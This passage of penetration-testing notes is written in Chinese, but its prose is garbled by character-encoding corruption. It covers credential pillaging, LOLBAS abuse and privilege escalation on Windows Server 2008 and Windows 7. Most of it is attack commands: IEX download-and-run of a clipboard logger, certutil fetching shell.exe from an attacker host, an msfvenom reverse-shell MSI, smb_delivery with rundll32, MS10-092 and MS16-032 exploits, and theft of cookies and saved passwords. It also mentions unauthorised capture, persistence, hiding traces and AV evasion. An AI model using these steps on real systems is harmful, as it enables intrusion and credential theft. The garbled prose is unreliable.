‚úÖ **ÊúÄÁµÇÁ∏ΩÁµê & ‰∏ã‰∏ÄÊ≠•Âª∫Ë≠∞** ‰Ω†ÁèæÂú®Â∑≤Á∂ìÊéåÊè°‰ºÅÊ•≠Áí∞Â¢É‰∏≠„ÄåÂà©Áî®Áî®Êà∂Ë°åÁÇ∫ÂèñÂæóÊÜëË≠â„ÄçÁöÑÂÆåÊï¥ÊµÅÁ®ãÔºåÂåÖÊã¨Ôºö

* Â¶Ç‰ΩïÂú®Êú™ÊéàÊ¨äÊÉÖÂ¢É‰∏≠ÈÄ≤Ë°å‰∏ªÂãïÊàñË¢´ÂãïÊçïÁç≤
* Â¶Ç‰ΩïÂà©Áî® SMB„ÄÅSCF/LNK Êñá‰ª∂ÂºïË™òË™çË≠â
* Â¶Ç‰ΩïÂà©Áî®ÂèñÂæóÁöÑ NTLM ÂìàÂ∏åÈÄ≤Ë°åÁ†¥Ëß£‰∏¶ÈÄ≤Ë°å‰∏ã‰∏ÄÊ≠•Ê©´ÂêëÊª≤ÈÄè

üëâ ‰∏ã‰∏ÄÊ≠•Ôºö

* ÈÖçÂêà CrackMapExec„ÄÅpth-winexe Á≠âÂ∑•ÂÖ∑ÔºåÂØ¶ÈöõÈÄ≤Ë°å Pass-The-Hash Ê∏¨Ë©¶
* Âà©Áî®Â∑≤Á†¥Ëß£Â∏≥ËôüÂòóË©¶ AD ÂüüÊéßÂà∂Âô®ÊàñÈ´òÊ¨äÈôê‰∏ªÊ©ü
* Á¢∫Á´ãÊåÅ‰πÖÂåñÔºàÂ¶ÇË®ªÂÜäË°®ÂæåÈñÄ„ÄÅScheduled TaskÔºâ‰∏¶Èö±ËîΩÁóïË∑°„ÄÇ

</details>

<details>

<summary>Pillaging Êé†Â•™</summary>

1Ô∏è‚É£ Pillaging Êé†Â•™ÊåáÂçó

üè¢ **ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµÔºö** Âú®Êª≤ÈÄèÈÅéÁ®ã‰∏≠ÔºåÂèñÂæóÁ≥ªÁµ±ÊéßÂà∂Ê¨äÂè™ÊòØÈñãÂßãÔºåÁúüÊ≠£ÈóúÈçµÊòØÊé†Â•™ÔºàPillagingÔºâÈöéÊÆµ‚Äî‚ÄîÈÄèÈÅéÁ≥ªÁµ±‰∏≠ÂêÑÁ®ÆË≥áË®äÔºàÊÜëË≠â„ÄÅË®≠ÂÆöÊ™î„ÄÅÊïèÊÑüÊñá‰ª∂„ÄÅÂÇô‰ªΩ„ÄÅcookie„ÄÅÊáâÁî®Á®ãÂºèÈÖçÁΩÆÁ≠âÔºâ‰æÜÁç≤ÂæóÊ©´ÂêëÁßªÂãïÊàñÊèêÊ¨äÁöÑÁ™ÅÁ†¥Âè£„ÄÇ

üå≥ **ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñÔºö**

```
Pillaging ÊîªÊìäÊµÅÁ®ã
‚îú‚îÄ 1. Á¢∫Ë™çÁí∞Â¢É (whoami /all„ÄÅhostname)
‚îú‚îÄ 2. ÊáâÁî®Á®ãÂºèË™øÊü•
‚îÇ   ‚îú‚îÄ dir / ls Êü•Áúã Program Files
‚îÇ   ‚îî‚îÄ PowerShell Êü•Ë®ªÂÜäË°®ÂÆâË£ùÁ¥ÄÈåÑ
‚îú‚îÄ 3. ÊïèÊÑüÈÖçÁΩÆÊ™îÊ°àËíêÈõÜ
‚îÇ   ‚îú‚îÄ mRemoteNG confCons.xml
‚îÇ   ‚îú‚îÄ SQL„ÄÅRDP„ÄÅFTP ÈÖçÁΩÆÊ™îÊ°à
‚îÇ   ‚îî‚îÄ Â∏∏Ë¶ãË∑ØÂæëÂ¶Ç %AppData%„ÄÅDocuments
‚îú‚îÄ 4. Browser Cookie ÊèêÂèñ
‚îÇ   ‚îú‚îÄ Firefox: cookies.sqlite
‚îÇ   ‚îú‚îÄ Chromium: SharpChromium Â∑•ÂÖ∑
‚îÇ   ‚îî‚îÄ Âà©Áî® cookie Á∑®ËºØÂô®ÁôªÂÖ•
‚îú‚îÄ 5. Ââ™Ë≤ºÁ∞øÁõ£Êéß (Clipboard)
‚îÇ   ‚îî‚îÄ Invoke-ClipboardLogger ÊçïÊçâÊÜëË≠â
‚îú‚îÄ 6. ÂÇô‰ªΩÁ≥ªÁµ±Êé†Â•™
‚îÇ   ‚îú‚îÄ ÊâæÂ∞ã restic Á≠âÂÇô‰ªΩÁ≥ªÁµ±
‚îÇ   ‚îú‚îÄ ÈÇÑÂéü / Á†¥Ëß£Âá∫Â∏≥ËôüÊàñÊÜëË≠â
‚îÇ   ‚îî‚îÄ Âà©Áî® AD ÈÖçÁΩÆËàáÁ≥ªÁµ±Âø´ÁÖß
‚îî‚îÄ 7. Ê©´ÂêëÁßªÂãï & ÊèêÊ¨ä
    ‚îú‚îÄ ‰ΩøÁî® Harvested ÊÜëË≠âÈÄ≤Ë°å Pass-the-Hash
    ‚îú‚îÄ Kerberos Ticket ÈáçÁî®
    ‚îî‚îÄ PowerUp„ÄÅWinPEAS ÊêúÂ∞ãÂèØÁî®ÊºèÊ¥û
```

üîé **Ë©≥Á¥∞Ê≠•È©üÔºãÁØÑ‰æã‰ª£Á¢ºÔºãËÉåÂæåÂéüÁêÜ**

**1Ô∏è‚É£ ÊáâÁî®Á®ãÂºèËàáÊúçÂãôË™øÊü•**

* cmd:

```cmd
 dir "C:\Program Files" 
```

* PowerShell:

```powershell
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion
$INSTALLED | ?{$_.DisplayName -ne $null} | Sort DisplayName | Format-Table -AutoSize
```

* ÂéüÁêÜÔºöÊâæÂá∫Á≥ªÁµ±Â∑≤ÂÆâË£ùÁöÑÈÅ†Á´ØÁÆ°ÁêÜÂ∑•ÂÖ∑„ÄÅDB„ÄÅÁÄèË¶ΩÂô®Á≠âÊΩõÂú®ÊïèÊÑüÁõÆÊ®ô„ÄÇ

**2Ô∏è‚É£ mRemoteNG ÈÖçÁΩÆÊ™îÊ°àËß£ÂØÜ**

* È†êË®≠Ë∑ØÂæëÔºö`%APPDATA%\mRemoteNG\confCons.xml`
* Python Ëß£ÂØÜËÖ≥Êú¨ÁØÑ‰æãÔºö

```bash
python3 mremoteng_decrypt.py -s "<encrypted_password>" -p mR3m
```

* Ëã•ÊúâËá™Ë®ÇÂØÜÁ¢ºÔºåÈÄèÈÅéÂ≠óÂÖ∏ÊîªÊìäÔºö

```bash
for pw in $(cat /usr/share/wordlists/rockyou.txt); do python3 mremoteng_decrypt.py -s <hash> -p $pw; done
```

**3Ô∏è‚É£ Cookie Êé†Â•™ÁØÑ‰æãÔºàSlackÔºâ**

* Firefox Ë∑ØÂæëÔºö`%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite`
* ÊèêÂèñÔºö

```bash
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
```

* Ë§áË£Ω cookie Ëá≥ Cookie-Editor Â§ñÊéõÔºåÈáçÂª∫ session„ÄÇ

**4Ô∏è‚É£ Clipboard Êà™Âèñ**

* PowerShell ÂïüÁî®Ôºö

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

* Á≠âÂæÖÊïèÊÑüÊñáÂ≠óÂá∫ÁèæÔºå‰æãÂ¶ÇÂØÜÁ¢ºÊàñ TOTP„ÄÇ

**5Ô∏è‚É£ ÂÇô‰ªΩÁ≥ªÁµ±Êª≤ÈÄè (Restic ÁØÑ‰æã)**

* È©óË≠âÂø´ÁÖßÔºö

```powershell
restic.exe -r E:\restic2\ snapshots
```

* ÈÇÑÂéüÂÇô‰ªΩÔºö

```powershell
restic.exe -r E:\restic2\ restore <snapshot_id> --target C:\Restore
```

* ÈóúÈçµÁõÆÊ®ôÔºöLinux Êâæ /etc/shadow„ÄÅid\_rsaÔºõWindows Êâæ SAM„ÄÅSYSTEM hive Âèä web.config„ÄÇ

‚úÖ **Â∞èÁµê & ‰∏ã‰∏ÄÊ≠•Âª∫Ë≠∞**

* Â∑≤ÂÆåÊàêÁ≥ªÁµ±Ë≥áÊ∫êÊé†Â•™
* ‰∏ã‰∏ÄÊ≠•Ôºö
  * Âà©Áî®ÂèñÂæóÁöÑÊÜëË≠âÈÄ≤Ë°åÊ©´ÂêëÊª≤ÈÄè
  * ‰ΩøÁî® mimikatz ÈÄ≤Ë°åÈÄ≤ÈöéÊÜëË≠âÊì∑Âèñ
  * Âà©Áî® AD ÂàÜÊûêÂ∑•ÂÖ∑ BloodHound Áπ™Ë£ΩÊ©´ÂêëÂúñË≠ú
  * ÊåÅÁ∫åÁõ£Êéß clipboard ÂíåÁ∂≤Ë∑ØÊµÅÈáè

üõ† **Debug Âá∫ÈåØËôïÁêÜË°®**

| ÂïèÈ°å               | Ëß£Ê±∫ÊñπÂºè                                          |
| ---------------- | --------------------------------------------- |
| Êâæ‰∏çÂà∞ confCons.xml | ÂàáÊèõÁõÆÊ®ôÂ∏≥Ëôü AppData ÊàñÂ∞ãÊâæ Portable ÁâàÊú¨                |
| Cookie Ëß£ÂØÜÂ§±Êïó      | Á¢∫Ë™ç chromium Ë∑ØÂæëÔºõÂòóË©¶ SharpChromium ÂèçÂ∞ÑÂü∑Ë°å          |
| ÂÇô‰ªΩÈÇÑÂéüÂ§±Êïó           | Ê∏¨Ë©¶ repository password Êàñ‰ΩøÁî® volume shadow copy |
| clipboard ÁÑ°ÂèçÊáâ    | Á¢∫Ë™ç PowerShell Execution Policy Ë®≠ÂÆöÁÇ∫ Bypass     |

</details>

<details>

<summary>„ÄåWindows Á≥ªÁµ±ÂéüÁîü‰∫åÈÄ≤‰ΩçÊ™îÊ°à„ÄçÂü∑Ë°åÊÉ°ÊÑèË°åÁÇ∫</summary>

üè¢ **ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ**

**Living Off The Land Binaries and Scripts (LOLBAS)** ÊòØÈáùÂ∞ç‰ºÅÊ•≠Áí∞Â¢ÉÊª≤ÈÄèÊ∏¨Ë©¶‰∏≠ÂøÖÂÇôÁöÑÈáçË¶ÅÊäÄÂ∑ß„ÄÇÂÆÉ‰ª£Ë°®ÊîªÊìäËÄÖ‰∏ç‰ΩøÁî®Á¨¨‰∏âÊñπÂ∑•ÂÖ∑ÔºåËÄåÊòØÂà©Áî®Á≥ªÁµ±ÂéüÁîüÂ∑≤Â≠òÂú®ÁöÑÂæÆËªüÁ∞ΩÁΩ≤Â∑•ÂÖ∑‰æÜÈÅîÊàêÊîªÊìäË°åÁÇ∫ÔºåÁõÆÁöÑÊòØÔºö

* ÁπûÈÅéÁ´ØÈªûÈò≤Á¶¶Á≥ªÁµ± (EDR)
* Èôç‰ΩéÂèØÁñëË°åÁÇ∫Áõ£Ê∏¨
* ÊèêÈ´òÈö±ÂåøÂ∫¶ËàáÈï∑ÊúüÂ≠òÊ¥ª
* ÊáâÁî®ÊñºÈ´òÂÆâÂÖ®ÊîøÁ≠ñÁí∞Â¢É

***

üå≥ **ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñ**

```
ÂàùÂßãÈöéÊÆµ
‚îÇ
‚îú‚îÄ ‰ø°ÊÅØÊî∂ÈõÜ
‚îÇ   ‚îú‚îÄ nmap ÊéÉÊèè
‚îÇ   ‚îú‚îÄ SMB„ÄÅRPC ÊûöËàâ
‚îÇ   ‚îî‚îÄ PowerView / AD Enumeration
‚îÇ
‚îú‚îÄ Âà©Áî®ÈöéÊÆµ
‚îÇ   ‚îú‚îÄ Âà©Áî®ÂèØÁî® LOLBAS Â∑•ÂÖ∑
‚îÇ   ‚îÇ   ‚îú‚îÄ certutil ÂÇ≥Ê™î & base64 Á∑®Ëß£Á¢º
‚îÇ   ‚îÇ   ‚îú‚îÄ rundll32 Âü∑Ë°åÊÉ°ÊÑè DLL
‚îÇ   ‚îÇ   ‚îî‚îÄ msiexec ÈÖçÂêà AlwaysInstallElevated ÊèêÊ¨ä
‚îÇ   ‚îî‚îÄ Ëã•Â§±Êïó ‚Üí ÂòóË©¶ÂÖ∂‰ªñÊèêÊ¨ä (Ë®àÂäÉ‰ªªÂãô„ÄÅÊúçÂãôÂº±Èªû„ÄÅÊºèÊ¥ûÂà©Áî®)
‚îÇ
‚îú‚îÄ ÂæåÊª≤ÈÄèÈöéÊÆµ
‚îÇ   ‚îú‚îÄ Âª∫Á´ãÊåÅ‰πÖÊÄß (ÂæåÈñÄ„ÄÅË®àÂäÉ‰ªªÂãô„ÄÅËá™Âïü DLL)
‚îÇ   ‚îú‚îÄ ÊÜëË≠âÊî∂ÈõÜ (Mimikatz„ÄÅLSASS Dump)
‚îÇ   ‚îî‚îÄ Ê©´ÂêëÁßªÂãï (Pass-the-Hash„ÄÅKerberos ÊîªÊìä)
‚îÇ
‚îî‚îÄ Â†±ÂëäÁ¥ÄÈåÑËàáÊ∏ÖÈô§ÁóïË∑°
```

***

üîé **Ë©≥Á¥∞Ê≠•È©üÔºãÁØÑ‰æã‰ª£Á¢ºÔºãËÉåÂæåÂéüÁêÜ**

#### 1Ô∏è‚É£ ‰ΩøÁî® certutil ÂÇ≥Ëº∏Êñá‰ª∂

* **ÂéüÁêÜ**Ôºöcertutil.exe ÂéüÊú¨ÁÇ∫ÊÜëË≠âÁÆ°ÁêÜÂ∑•ÂÖ∑Ôºå‰ΩÜÂÖ∑Êúâ URL ‰∏ãËºâËàá base64 Á∑®Ëß£Á¢ºÂäüËÉΩ
* **ÁØÑ‰æã**Ôºö

```powershell
certutil.exe -urlcache -split -f http://<‰Ω†ÁöÑIP>:8080/shell.exe shell.exe
```

* **ÁµêÊûú**Ôºöshell.exe Â∞áË¢´‰∏ãËºâÂà∞Êú¨Âú∞
* **Debug ÊñπÊ≥ï**Ôºö
  * Ê™¢Êü• IP/PORT
  * Ê∏¨Ë©¶ÈÄ£Á∑öÔºàping Êàñ curlÔºâ
  * Á¢∫Ë™ç IIS/HTTP Server ÊúâÂïüÂãï

#### 2Ô∏è‚É£ certutil Á∑®Á¢º & Ëß£Á¢º

* **ÂéüÁêÜ**Ôºö‰ª• base64 Ê†ºÂºèÂú®ÊñáÂ≠ó‰∏≠ÂÇ≥ÈÅûÂèØÂü∑Ë°åÊ™îÊ°à‰ª•Ë¶èÈÅøÊîîÊà™
* **Á∑®Á¢º**Ôºö

```powershell
certutil -encode payload.exe payload.txt
```

* **Ëß£Á¢º**Ôºö

```powershell
certutil -decode payload.txt payload.exe
```

* **Debug ÊñπÊ≥ï**Ôºö
  * Ê™¢Êü• txt Êñá‰ª∂ÂÆåÊï¥ÊÄß
  * Ëã•Ëß£Á¢ºÂ§±ÊïóÔºåÊâãÂãïÊ™¢Êü•Êñá‰ª∂ÊòØÂê¶Ë¢´Êà™Êñ∑

#### 3Ô∏è‚É£ Ê™¢Êü• AlwaysInstallElevated Ê¨äÈôê

* **ÂéüÁêÜ**ÔºöËã•Á≥ªÁµ±Ëàá‰ΩøÁî®ËÄÖÂêåÊôÇÂïüÁî®Ôºå‰ªª‰Ωï MSI ÂÆâË£ùÂåÖÂ∞á‰ª• SYSTEM Ê¨äÈôêÂü∑Ë°å
* **Ê™¢Êü•Êåá‰ª§**Ôºö

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

* **Debug ÊñπÊ≥ï**Ôºö
  * Ëã•ÈçµÂÄº‰∏çÂ≠òÂú®ÊàñÁÇ∫ 0ÔºåË°®Á§∫ÁÑ°Ê≠§ÊºèÊ¥û

#### 4Ô∏è‚É£ ÁîüÊàêÊÉ°ÊÑè MSI

* **ÂéüÁêÜ**ÔºöÂà©Áî® msfvenom ÁîüÊàêÂê´ÂèçÂêëÈÄ£Á∑ö Payload ÁöÑ MSI Êñá‰ª∂
* **ÁØÑ‰æã**Ôºö

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<‰Ω†ÁöÑIP> LPORT=4444 -f msi > evil.msi
```

* **Debug ÊñπÊ≥ï**Ôºö
  * Á¢∫‰øù listener ÊúâÊ≠£Á¢∫ÈñãÂïü (nc -lvnp 4444)
  * Ê∏¨Ë©¶ÂèçÂêëÈÄ£Á∑öÂèØÈÄö

#### 5Ô∏è‚É£ Âü∑Ë°å MSI ÊèêÊ¨ä

* **ÁØÑ‰æã**Ôºö

```powershell
msiexec /i C:\path\to\evil.msi /quiet /qn /norestart
```

* **Debug ÊñπÊ≥ï**Ôºö
  * Ëã•ÁÑ°ÂõûÈÄ£ÔºåÁ¢∫Ë™çÈò≤ÁÅ´ÁâÜ„ÄÅAV ÊòØÂê¶ÊîîÊà™
  * Á¢∫Ë™çÁõÆÊ®ô‰∏ªÊ©üÊòØÂê¶ÂÖÅË®±Âü∑Ë°å MSI

***

üõ† **Â¶ÇÊûú Debug Âá∫ÈåØÊÄéÈ∫ºËæ¶Ôºü**

| ÂïèÈ°å                          | Debug Á≠ñÁï•                                          |
| --------------------------- | ------------------------------------------------- |
| certutil ÁÑ°Ê≥ï‰∏ãËºâ               | È©óË≠â URL ÊòØÂê¶ÈÄöÔºõÁî® curl Ê∏¨Ë©¶ÔºõÊ™¢Êü• proxy/firewall Ë®≠ÂÆö         |
| MSI Ê≤íÂèçÂêë shell               | Ê™¢Êü• msfconsole listenerÔºõÈáçÊñ∞Áî¢Áîü payloadÔºõÁ¢∫Ë™ç Port ÊúâÁÑ°Ë¢´Âç†Áî® |
| AlwaysInstallElevated ÁÇ∫ 0x0 | Â∞ãÊâæÂÖ∂‰ªñÊèêÊ¨äÈÄîÂæëÔºåÂ¶ÇË®àÁï´‰ªªÂãôÂº±Ê¨äÈôêÊàñ DLL Âä´ÊåÅ                         |
| payload Ë¢´ AV Âà™Èô§             | ÂòóË©¶Âä†ÊÆº (obfuscation)„ÄÅ‰øÆÊîπËºâÈ´îÔºõÊàñ‰ΩøÁî®ÂÖ∂‰ªñ LOLBAS              |

***

</details>

<details>

<summary>Windows Server 2008</summary>

üè¢ **ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ**

Windows Server 2008 Áõ∏Â∞çÊñº Server 2016/2019 Áº∫‰πèÂ§öÈ†ÖÁèæ‰ª£Èò≤Ë≠∑ÊäÄË°ìÔºàÂ¶Ç ATP„ÄÅCredential Guard„ÄÅControl Flow GuardÔºâ„ÄÇÂ∞çÊîªÊìäËÄÖ‰æÜË™™ÔºåÈÄôÊòØÁ∂ìÂÖ∏Êª≤ÈÄèÂàáÂÖ•ÈªûÔºåÂõ†ÁÇ∫Ôºö

* Ë£ú‰∏Å‰∏çÂÖ®
* Áº∫‰πèÁèæ‰ª£‰øùË≠∑Ê©üÂà∂
* ÂÆπÊòìÁôºÁèæÊºèÊ¥û‰∏¶Âà©Áî®Ôºà‰æãÂ¶Ç MS10-092„ÄÅMS17-010Ôºâ
* ÈÄöÂ∏∏Ë¢´Áî®ÊñºÈóúÈçµÊ•≠ÂãôËÄåÈõ£‰ª•Ê±∞Êèõ

***

üå≥ **ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñ**

```
1. Á≥ªÁµ±ÁâàÊú¨Á¢∫Ë™ç
   ‚îî‚îÄ nmap„ÄÅSMB banner Á¢∫Ë™çÁâàÊú¨
2. ÂÆâÂÖ®Êõ¥Êñ∞ÁãÄÊÖãÊ™¢Êü•
   ‚îú‚îÄ wmic qfe
   ‚îî‚îÄ Sherlock / Windows-Exploit-Suggester
3. ÈÅ†Á´ØÊºèÊ¥ûÂà©Áî®ÔºàËã•Â≠òÂú®Ôºâ
   ‚îú‚îÄ EternalBlue
   ‚îî‚îÄ SMB Delivery
4. Âª∫Á´ãÂàùÊ≠• Meterpreter ÂõûÈÄ£
5. Êú¨Âú∞ÊèêÊ¨ä
   ‚îú‚îÄ MS10-092Ôºà‰ªªÂãôË®àÂäÉ XML ÊºèÊ¥ûÔºâ
   ‚îî‚îÄ MS16-032„ÄÅMS15-051 Á≠â
6. Êî∂ÈõÜÊïèÊÑüË≥áÊñô„ÄÅÊ©´ÂêëÁßªÂãï
```

***

üîé **ÊØè‰∏ÄÊ≠•Ë©≥Á¥∞Ê≠•È©üÔºã‰ª£Á¢ºÔºãËÉåÂæåÂéüÁêÜ**

#### 1Ô∏è‚É£ Á≥ªÁµ±ÁâàÊú¨Á¢∫Ë™ç

**ÂéüÁêÜ**ÔºöÈÄöÈÅéÂÅµÊ∏¨ÂõûÊáâ‰∏≠ÁöÑ OS Banner„ÄÅÊàñ SMB Ëàá RDP banner Á¢∫ÂÆöÁõÆÊ®ôÁ≥ªÁµ±

```bash
nmap -sV -O -p 135,139,445,3389 <IP>
smbclient -L //<IP> -N
```

**Ëº∏Âá∫ÁµêÊûúÁØÑ‰æã**ÔºöWindows Server 2008 R2 Detected

#### 2Ô∏è‚É£ ÂÆâÂÖ®Êõ¥Êñ∞ÁãÄÊÖãÊ™¢Êü•

**ÂéüÁêÜ**ÔºöÈÄèÈÅé `wmic qfe` ÂàóÂá∫Â∑≤ÂÆâË£ù KBÔºåÊàñ‰ΩøÁî® Sherlock.ps1 ÊâæÁº∫Â§±‰øÆË£ú

```powershell
wmic qfe
Import-Module .\Sherlock.ps1
Find-AllVulns
```

**ÁµêÊûú**ÔºöÈ°ØÁ§∫Âá∫Â¶Ç MS10-092„ÄÅMS16-032 Â∞öÊú™‰øÆË£ú

#### 3Ô∏è‚É£ Âà©Áî® SMB Delivery ÂèñÂæó Meterpreter

**ÂéüÁêÜ**ÔºöÈÄèÈÅé SMB Ê®°ÁµÑÂÇ≥ÈÅû DLLÔºåÂà©Áî® rundll32 Ëß∏ÁôºÈÅ†Á´ØÂü∑Ë°å

```bash
use exploit/windows/smb/smb_delivery
set LHOST <ÊîªÊìäÊ©ü IP>
exploit
```

ÁÑ∂ÂæåÂú®ÁõÆÊ®ôÊ©ü‰∏äÂü∑Ë°åÔºö

```bash
rundll32.exe \\<attacker-ip>\<share>\test.dll,0
```

**ÁµêÊûú**ÔºöÂõûÈÄ£ Meterpreter Shell

#### 4Ô∏è‚É£ ÊèêÊ¨äÔºàMS10-092 ÁØÑ‰æãÔºâ

**ÂéüÁêÜ**ÔºöÂà©Áî®‰ªªÂãôË®àÂäÉ XML Ë®≠ÂÆöÂº±ÈªûÊèêÊ¨ä

```bash
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <ÊîªÊìäÊ©ü IP>
set LPORT 4443
exploit
```

**ÁµêÊûú**ÔºöÂèñÂæó NT AUTHORITY\SYSTEM Ê¨äÈôê

***

üõ† **Â¶ÇÊûú Debug Âá∫ÈåØÊÄéÈ∫ºËæ¶Ôºü**

| ÂïèÈ°å               | Debug Á≠ñÁï•                                |
| ---------------- | --------------------------------------- |
| SMB delivery ÁÑ°ÂõûÈÄ£ | Ê™¢Êü•Èò≤ÁÅ´ÁâÜ„ÄÅIP Ë®≠ÂÆöÊòØÂê¶Ê≠£Á¢∫„ÄÅÁ¢∫Ë™ç SMB 445 port ÈñãÊîæ      |
| Sherlock Âü∑Ë°åÂ§±Êïó    | ‰ΩøÁî® Set-ExecutionPolicy bypass ÊàñÁ¢∫Ë™ç PS Ê¨äÈôê |
| ÊèêÊ¨äÂ§±Êïó             | Á¢∫Ë™çÂ∑≤ÈÅ∑ÁßªËá≥ 64-bit ÈÄ≤Á®ãÔºõÊ™¢Êü•ÊºèÊ¥ûÈÅ©Áî®Ê¢ù‰ª∂               |
| rundll32 Êåá‰ª§ÁÑ°Êïà    | Ê™¢Êü•Ë∑ØÂæëÊãºÂØ´„ÄÅSMB ÂÖ±‰∫´ÊòØÂê¶Ê≠£Â∏∏„ÄÅÊàñÊîπÁî® PowerShell Âü∑Ë°å     |

***



</details>

<details>

<summary>Windows 7</summary>

üè¢ **ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ**

Windows 7 ÂêåÊ®£Áº∫‰πèÁèæ‰ª£ Windows 10 Êèê‰æõÁöÑÈò≤Ë≠∑ÊäÄË°ìÔºàÂ¶Ç MFA„ÄÅÂ§öÂ±§ÊÜëË≠â‰øùË≠∑„ÄÅDevice Guard„ÄÅControl Flow GuardÔºâ„ÄÇÂú®Êª≤ÈÄèÊ∏¨Ë©¶‰∏≠ÔºåWindows 7 Á≥ªÁµ±‰ªçÂª£Ê≥õÂ≠òÂú®ÊñºË®±Â§öÁî¢Ê•≠Áí∞Â¢É‰∏≠ÔºàÂ¶ÇÈÜ´ÁôÇ„ÄÅÈõ∂ÂîÆ„ÄÅÈáëËûç„ÄÅÊîøÂ∫úÈÉ®ÈñÄÔºâÔºå‰∏îÈÄöÂ∏∏Èõ£‰ª•Ê∑òÊ±∞ÔºåÈÄôÊàêÁÇ∫ÊîªÊìäËÄÖÊúÄÂÆπÊòìÂèñÂæóÁ≥ªÁµ±ÊéßÂà∂Ê¨äÁöÑÂÖ•Âè£„ÄÇ

***

üå≥ **ÊîªÊìäÊµÅÁ®ãÊ®πÁãÄÂúñÔºàWindows 7Ôºâ**

```
1. Á≥ªÁµ±ÁâàÊú¨Á¢∫Ë™ç
   ‚îî‚îÄ nmap„ÄÅSMB/RDP banner Á¢∫Ë™çÁâàÊú¨
2. Êî∂ÈõÜË£ú‰∏ÅÁãÄÊÖã
   ‚îú‚îÄ systeminfo
   ‚îú‚îÄ wmic qfe
   ‚îî‚îÄ Windows-Exploit-Suggester / Sherlock
3. ÈÅ†Á´ØÊàñÊú¨Âú∞ÊºèÊ¥ûÂà©Áî®
   ‚îú‚îÄ EternalBlue (Ëã• SMB Â≠òÂú®)
   ‚îî‚îÄ Exploit SMB Delivery Ê®°ÁµÑÂÇ≥ÈÅû
4. Âª∫Á´ã Meterpreter ÂèçÂêëÈÄ£Á∑ö
5. Êú¨Âú∞ÊèêÊ¨ä
   ‚îú‚îÄ MS16-032 (‰∫åÊ¨°ÁôªÂÖ•ÊèêÊ¨ä)
   ‚îú‚îÄ MS15-051„ÄÅHot Potato (Rotten Potato)
   ‚îî‚îÄ ÂÖ∂‰ªñÊú¨Âú∞ÊèêÊ¨äÊ®°ÁµÑ
6. Êì∑ÂèñÊïèÊÑüÊ™îÊ°à„ÄÅÊèêÂèñÊÜëË≠â„ÄÅÊ©´ÂêëÁßªÂãï
```

***

üîé **Ë©≥Á¥∞Ê≠•È©üÔºãÁØÑ‰æã‰ª£Á¢ºÔºãÂéüÁêÜ**

#### 1Ô∏è‚É£ Á≥ªÁµ±ÁâàÊú¨Á¢∫Ë™ç

**ÂéüÁêÜ**ÔºöÂà©Áî®ÊéÉÊèèËàá SMB/RDP banner Âà§Âà•Á≥ªÁµ±ÁâàÊú¨

```bash
nmap -sV -O -p 135,139,445,3389 <ÁõÆÊ®ôIP>
smbclient -L //<ÁõÆÊ®ôIP> -N
```

**È†êÊúüÁµêÊûú**ÔºöÈ°ØÁ§∫ Windows 7 Professional / Enterprise Á≥ªÁµ±

#### 2Ô∏è‚É£ ÂÆâÂÖ®Êõ¥Êñ∞ÁãÄÊÖãÊ™¢Êü•

**ÂéüÁêÜ**Ôºö‰ΩøÁî® systeminfo Ëº∏Âá∫ÁµêÂêà Windows-Exploit-Suggester Ëá™ÂãïÂà§Êñ∑Áº∫Â∞ëÁöÑÂÆâÂÖ®Êõ¥Êñ∞

```bash
systeminfo > sysinfo.txt
python2 windows-exploit-suggester.py --database <ÊúÄÊñ∞xlsÊ™î> --systeminfo sysinfo.txt
```

**ÁµêÊûú**ÔºöÂàóÂá∫ÊΩõÂú®ÊºèÊ¥ûÔºàÂ¶Ç MS16-032„ÄÅMS15-051Ôºâ

#### 3Ô∏è‚É£ Âª∫Á´ãÂàùÊ≠•ÂèçÂêë shell

**ÊñπÂºè**ÔºöÂèØÈÄèÈÅéÁ§æ‰∫§Â∑•Á®ãÂÇ≥ÈÄÅ payload Êàñ‰ΩøÁî® SMB Delivery Ê®°ÁµÑ

```bash
use exploit/windows/smb/smb_delivery
set LHOST <ÊîªÊìäÊ©üIP>
exploit
```

ÁõÆÊ®ô‰∏ªÊ©üÂü∑Ë°åÔºö

```bash
rundll32.exe \\<ÊîªÊìäÊ©üIP>\<Èö®Ê©üË∑ØÂæë>\test.dll,0
```

#### 4Ô∏è‚É£ Êú¨Âú∞ÊèêÊ¨ä - MS16-032 Âà©Áî®ÁØÑ‰æã

**ÂéüÁêÜ**ÔºöÈÄèÈÅé Windows ‰∫åÊ¨°ÁôªÂÖ•ÊúçÂãôË®≠Ë®àÁº∫Èô∑ÂèñÂæó SYSTEM Ê¨äÈôê

```powershell
Set-ExecutionPolicy bypass -Scope process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

**ÁµêÊûú**ÔºöÊàêÂäüÁî¢Áîü NT AUTHORITY\SYSTEM Ê¨äÈôêÁöÑÂëΩ‰ª§Âàó‰ªãÈù¢

***

üõ† **Â¶ÇÊûú Debug Âá∫ÈåØÊÄéÈ∫ºËæ¶Ôºü**

| ÂïèÈ°å                           | Debug Ëß£Ê±∫ÊñπÊ≥ï                                        |
| ---------------------------- | ------------------------------------------------- |
| Ê≤íÂÅµÊ∏¨Âà∞ OS ÁâàÊú¨                   | ‰ΩøÁî® `smbclient`„ÄÅ`rdp banner`ÔºåÊàñ Nessus ÈÄ≤Ë°åË≥áÂÆâÊéÉÊèèÈ©óË≠â     |
